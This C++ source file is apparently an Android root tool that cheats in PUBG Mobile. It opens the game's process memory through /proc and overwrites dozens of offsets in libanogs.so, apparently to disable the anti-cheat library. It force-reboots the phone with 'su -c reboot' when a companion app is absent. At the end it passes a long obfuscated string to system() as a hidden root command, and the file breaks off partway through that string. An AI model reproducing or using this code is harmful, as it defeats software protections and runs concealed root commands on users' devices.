#include <malloc.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <math.h>
#include <thread>
#include <iostream>
#include <string.h>
#include <sys/types.h>
#include <regex.h>
#include <fstream>
#include <iostream>
#include "Not.h"
#include <#IDK.h>
#include <ENC.h>
#include <KILL.hpp>

int handle;
int ProcessID = 0;
typedef int8_t AbdullaKassabByte;
typedef int64_t AbdullaKassabQword;
using namespace std;
typedef char PACKAGENAME;

char *pkg;
char *pak;
char *apk;
ofstream succes_file;
ofstream error_file;

void AbdullaKassabXRe()
{
system(AbdullaKassabMakeYouStupid("su -c reboot"));
}

long int GetBase(int pid, const char *Name)
{
	FILE *fp;
	long addr = 0;
	char *pch;
	char filename[32];
	char line[1024];
	snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
	fp = fopen(filename, "r");
	if (fp != NULL)
	{
		while (fgets(line, sizeof(line), fp))
		{
			if (strstr(line, Name))
			{
				pch = strtok(line, "-");
				addr = strtoul(pch, NULL, 16);
				break;
			}
		}
		fclose(fp);
	}
	return addr;
}

template<typename T>
int WriteHex(uintptr_t addr, T value) {
    pwrite64(handle, &value, 4, addr);
    return 0;
}

int WriteByte(long int addr, AbdullaKassabByte value)
{
	pwrite64(handle, &value, 4, addr);
	return 0;
}

int WriteDword(long int addr, int value)
{
	pwrite64(handle, &value, 4, addr);
	return 0;
}

int WriteFloat(long int addr, float value)
{
	pwrite64(handle, &value, 4, addr);
	return 0;
}

int WriteQword(long int addr, AbdullaKassabQword value)
{
	pwrite64(handle, &value, 4, addr);
	return 0;
}

uintptr_t Offset(const char *c)
{
	int base = 16;
	static_assert(sizeof(uintptr_t) == sizeof(unsigned long)
				  || sizeof(uintptr_t) == sizeof(unsigned long long),
				  "Please add string to handle conversion for this architecture.");
	if (sizeof(uintptr_t) == sizeof(unsigned long))
	{
		return strtoul(c, nullptr, base);
	}
	return strtoull(c, nullptr, base);
}

string GetStdOut(string cmd)
{
	string data;
	FILE *stream;
	const int max_buffer = 256;
	char buffer[max_buffer];
	cmd.append(" 2>&1");
	stream = popen(cmd.c_str(), "r");
	if (stream)
	{
		while (!feof(stream))
			if (fgets(buffer, max_buffer, stream) != NULL)
				data.append(buffer);
		pclose(stream);
	}
	return data;
}

int AbdullaKassabXInstalled(const char * bm)
{
	char AbdullaKassabLetter[128];
	sprintf(AbdullaKassabLetter, AbdullaKassabMakeYouStupid("/data/data/com.google.vrplugins"), bm);
	DIR *AbdullaKassabDir;
	AbdullaKassabDir = opendir(AbdullaKassabLetter);
	if (AbdullaKassabDir == NULL)
	{
		AbdullaKassabXRe();
		return 0;
	}
	else
	{
		return 1;
	}
}

int AbdullaKassabXInstalled2(const char * bm)
{
	char AbdullaKassabLetter[128];
	sprintf(AbdullaKassabLetter, AbdullaKassabMakeYouStupid("/data/data/com.google.vrplugins/files"), bm);
	DIR *AbdullaKassabDir;
	AbdullaKassabDir = opendir(AbdullaKassabLetter);
	if (AbdullaKassabDir == NULL)
	{
		AbdullaKassabXRe();
		return 0;
	}
	else
	{
		return 1;
	}
}

int AbdullaKassabXInstalled3(const char * bm)
{
	char AbdullaKassabLetter[128];
	sprintf(AbdullaKassabLetter, AbdullaKassabMakeYouStupid("/data/data/com.google.vrplugins/shared_prefs"), bm);
	DIR *AbdullaKassabDir;
	AbdullaKassabDir = opendir(AbdullaKassabLetter);
	if (AbdullaKassabDir == NULL)
	{
		AbdullaKassabXRe();
		return 0;
	}
	else
	{
		return 1;
	}
}

int MemoryHandle()
{
	ProcessID = getPID(AbdullaKassabMakeYouStupid("com.tencent.ig"));
    if (ProcessID == 0) { ProcessID = getPID(AbdullaKassabMakeYouStupid("com.pubg.krmobile"));
    if (ProcessID == 0) { ProcessID = getPID(AbdullaKassabMakeYouStupid("com.rekoo.pubgm"));
    if (ProcessID == 0) { ProcessID = getPID(AbdullaKassabMakeYouStupid("com.vng.pubgmobile"));
    if (ProcessID == 0) { ProcessID = getPID(AbdullaKassabMakeYouStupid("com.pubg.imobile"));
    if (ProcessID == 0) { puts(AbdullaKassabMakeYouStupid("Pᴜʙɢ Mᴏʙɪʟᴇ Nᴏᴛ Rᴜɴɴɪɴɢ !!!")); exit(1); } } } } }
	char lj[64];
	sprintf(lj, "/proc/%d/mem", ProcessID);
	handle = open(lj, O_RDWR);
	if (handle == -1)
	{
		puts(AbdullaKassabMakeYouStupid("Fᴀɪʟᴇᴅ Tᴏ Aɴᴀʟɪᴢᴇ Mᴇᴍᴏʀʏ !!!"));
		exit(1);
	}
	return 0;
}

// Generate Tools

void F20();
void F22();
void F23();
void IDK20();
void IDK22();
void IDK23();

int Exit();
void CheckPUBGM();
void CheckPUBGMRunning();
int main(int argc, char **argv)
{
	char *fitur = argv[1];
	if (strcmp(fitur, AbdullaKassabMakeYouStupid("F20")) == 0)
	{
		F20();
	}
	if (strcmp(fitur, AbdullaKassabMakeYouStupid("F22")) == 0)
	{
		F22();
	}
	if (strcmp(fitur, AbdullaKassabMakeYouStupid("F23")) == 0)
	{
		F23();
	}
		if (strcmp(fitur, AbdullaKassabMakeYouStupid("IDK20")) == 0)
	{
		IDK20();
	}
	if (strcmp(fitur, AbdullaKassabMakeYouStupid("IDK22")) == 0)
	{
		IDK22();
	}
	if (strcmp(fitur, AbdullaKassabMakeYouStupid("IDK23")) == 0)
	{
		IDK23();
	}

	else
	{
		Exit();
	}
}

void CheckPUBGMRunning()
{
	if (isapkrunning(AbdullaKassabMakeYouStupid("com.tencent.ig")) == 1)
	{
		pak = AbdullaKassabMakeYouStupid("com.tencent.ig");
	}
	else if (isapkrunning(AbdullaKassabMakeYouStupid("com.pubg.krmobile")) == 1)
	{
		pak = AbdullaKassabMakeYouStupid("com.pubg.krmobile");
	}
	else if (isapkrunning(AbdullaKassabMakeYouStupid("com.rekoo.pubgm")) == 1)
	{
		pak = AbdullaKassabMakeYouStupid("com.rekoo.pubgm");
	}
	else if (isapkrunning(AbdullaKassabMakeYouStupid("com.vng.pubgmobile")) == 1)
	{
		pak = AbdullaKassabMakeYouStupid("com.vng.pubgmobile");
	}
	else if (isapkrunning(AbdullaKassabMakeYouStupid("com.pubg.imobile")) == 1)
	{
		pak = AbdullaKassabMakeYouStupid("com.pubg.imobile");
	}
	else
	{
		cout << AbdullaKassabMakeYouStupid("PUBGM is not running!") << endl;
		Exit();
  }
}

void CheckPUBGM()
{
  if (AbdullaKassabXInstalled(AbdullaKassabMakeYouStupid("/data/data/com.google.vrplugins/shared_prefs")) == 1)
 {
    if (AbdullaKassabXInstalled2(AbdullaKassabMakeYouStupid("/data/data/com.google.vrplugins")) == 1)
 {
 if (AbdullaKassabXInstalled3(AbdullaKassabMakeYouStupid("/data/data/com.google.vrplugins/files")) == 1)
  {
  if (isapkrunning(AbdullaKassabMakeYouStupid("com.fennec.jo")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("com.fennec.jo");
 }
 else if (isapkrunning(AbdullaKassabMakeYouStupid("com.sharppro.application")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("com.sharppro.application");
 }
  else if (isapkrunning(AbdullaKassabMakeYouStupid("com.desert.jo")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("com.desert.jo");
 }
 else if (isapkrunning(AbdullaKassabMakeYouStupid("com.idk.jo")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("com.idk.jo");
 }
 else if (isapkrunning(AbdullaKassabMakeYouStupid("me.jagar.rog")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("me.jagar.rog");
 }
  else if (isapkrunning(AbdullaKassabMakeYouStupid("com.rog.application")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("com.rog.application");
 }
 else if (isapkrunning(AbdullaKassabMakeYouStupid("com.sharppro.application")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("com.sharppro.application");
 }
 else if (isapkrunning(AbdullaKassabMakeYouStupid("com.trojan5.vip")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("com.trojan5.vip");
 }
  else if (isapkrunning(AbdullaKassabMakeYouStupid("com.cryizer.vip")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("com.cryizer.vip");
 }
  else if (isapkrunning(AbdullaKassabMakeYouStupid("me.app.petoucheat")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("me.app.petoucheat");
 }
  else if (isapkrunning(AbdullaKassabMakeYouStupid("com.hishi.qr7ip")) == 1)
 {
  pkg = AbdullaKassabMakeYouStupid("com.hishi.qr7ip");
 }
 else
 {
  AbdullaKassabXRe();
  Exit();
     }
    }
   }
  }
}
int Exit()
{
	exit(0);
	return 0;
}


void F20()
{
CheckPUBGM();
MemoryHandle();
CheckPUBGMRunning();

string aw1 = OBFUSCATE("/data/1");
ofstream MyFile(aw1);
string aw2 = OBFUSCATE("/data/2");
ofstream MyFile2(aw2);
  MyFile << pkg;
  MyFile.close();
  MyFile2 << pak;
  MyFile2.close();


//WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanort.so")) + Offset(AbdullaKassabMakeYouStupid("0x1b3500")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3848")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3868")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b386c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b387c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3940")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3944")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3948")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b394c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3950")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3954")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3958")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b395c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3960")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3964")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3968")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b396c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3970")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3974")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3978")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b397c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3980")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3984")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3988")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b398c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3990")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39a0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39a4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39a8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39ac")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39b0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39dc")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39e0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39e4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39e8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39ec")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39f0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39f4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39f8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b39fc")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a00")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a04")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a08")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a0c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a10")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a14")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a18")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a1c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a20")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a24")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a28")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a2c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a30")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a34")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a38")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a3c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a40")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a44")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a48")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a4c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a50")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a54")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a58")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a5c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a60")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a64")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a68")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a6c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a70")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a74")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a78")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a7c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a80")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a84")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a88")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a8c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a90")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a94")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a98")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3a9c")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3d30")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4b3d50")), -763363328);

///قديم 



system(KILLERQ::KILLERQDE(KILLERQ::KILLERQDE(OBFUSCATE("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